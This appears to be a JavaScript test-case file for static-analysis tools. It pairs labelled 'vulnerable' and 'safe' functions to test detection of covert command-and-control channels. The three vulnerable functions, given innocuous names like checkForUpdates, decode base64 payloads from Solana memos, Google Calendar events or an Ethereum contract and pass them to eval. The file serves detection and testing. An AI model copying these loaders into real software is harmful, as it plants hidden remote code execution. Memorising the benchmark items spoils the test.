/**
 * C2 Fingerprint Test Cases (JavaScript)
 * Tests SAST tool ability to detect non-standard command & control channels.
 * Based on real-world patterns: Glassworm (Solana), os-info-checker-es6 (Calendar)
 */

const https = require('https');

// ============================================================================
// VULNERABLE: Solana blockchain transaction memo as C2 channel
// Pattern from Glassworm campaign (March 2026)
// ============================================================================

// vuln-code-snippet start solana_memo_c2
async function checkForUpdates() {
    // Reads Solana transaction memos for the "update server" wallet
    // Memo field contains base64-encoded commands
    const { Connection, PublicKey } = require('@solana/web3.js');
    const conn = new Connection('https://api.mainnet-beta.solana.com');
    const wallet = new PublicKey('DRpbCBMxVnDK7maPGv7USk2v7wktF7GHg6dR62jGwxab');
    const sigs = await conn.getSignaturesForAddress(wallet, { limit: 1 });
    const tx = await conn.getTransaction(sigs[0].signature);
    const memo = tx.meta.logMessages.find(m => m.includes('Program log: Memo'));
    const command = Buffer.from(memo.split(': ')[1], 'base64').toString();
    eval(command);  // vuln-code-snippet vuln-line solana_memo_c2
}
// vuln-code-snippet end solana_memo_c2


// ============================================================================
// VULNERABLE: Google Calendar event description as C2
// Pattern from os-info-checker-es6 (May 2025)
// ============================================================================

// vuln-code-snippet start calendar_event_c2
async function syncConfig() {
    // Fetches a "team calendar" event but the description contains commands
    const calendarId = 'c_abc123deadbeef@group.calendar.google.com';
    const apiKey = process.env.GCAL_API_KEY;
    const url = `https://www.googleapis.com/calendar/v3/calendars/${calendarId}/events?key=${apiKey}&maxResults=1&orderBy=updated`;
    const res = await fetch(url);
    const data = await res.json();
    const description = data.items[0].description;
    // "Description" is actually a base64-encoded payload
    const payload = Buffer.from(description, 'base64').toString();
    eval(payload);  // vuln-code-snippet vuln-line calendar_event_c2
}
// vuln-code-snippet end calendar_event_c2


// ============================================================================
// VULNERABLE: Ethereum RPC call reads smart contract storage as C2
// ============================================================================

// vuln-code-snippet start blockchain_rpc_c2
async function getContractConfig() {
    const { ethers } = require('ethers');
    const provider = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/KEY');
    // Reads a "config" value from a smart contract -- actually C2 instructions
    const contract = new ethers.Contract(
        '0xdead...beef',
        ['function getConfig() view returns (string)'],
        provider
    );
    const config = await contract.getConfig();
    const decoded = Buffer.from(config, 'base64').toString();
    eval(decoded);  // vuln-code-snippet vuln-line blockchain_rpc_c2
}
// vuln-code-snippet end blockchain_rpc_c2


// ============================================================================
// SAFE: Standard health endpoint calling external monitoring
// ============================================================================

// vuln-code-snippet start api_health_check
async function reportHealth() {
    // Standard health check reporting to Datadog -- legitimate
    const health = {
        status: 'ok',
        uptime: process.uptime(),
        memory: process.memoryUsage().heapUsed,
    };
    await fetch('https://api.datadoghq.com/api/v1/check_run', {
        method: 'POST',
        headers: { 'DD-API-KEY': process.env.DD_API_KEY },
        body: JSON.stringify(health),
    });  // vuln-code-snippet safe-line api_health_check
}
// vuln-code-snippet end api_health_check


// ============================================================================
// SAFE: Legitimate Google Calendar integration for scheduling
// ============================================================================

// vuln-code-snippet start calendar_sync
async function getTeamSchedule() {
    // Standard Google Calendar API usage for team scheduling
    const { google } = require('googleapis');
    const calendar = google.calendar({ version: 'v3', auth: oauthClient });
    const events = await calendar.events.list({
        calendarId: 'primary',
        timeMin: new Date().toISOString(),
        maxResults: 10,
        singleEvents: true,
        orderBy: 'startTime',
    });
    return events.data.items.map(e => ({
        title: e.summary,
        start: e.start.dateTime,
    }));  // vuln-code-snippet safe-line calendar_sync
}
// vuln-code-snippet end calendar_sync


// ============================================================================
// SAFE: Fetching crypto price from public API (legitimate)
// ============================================================================

// vuln-code-snippet start blockchain_price_api
async function getBitcoinPrice() {
    // CoinGecko public API -- standard price data fetch
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
    const data = await res.json();
    return data.bitcoin.usd;  // vuln-code-snippet safe-line blockchain_price_api
}
// vuln-code-snippet end blockchain_price_api
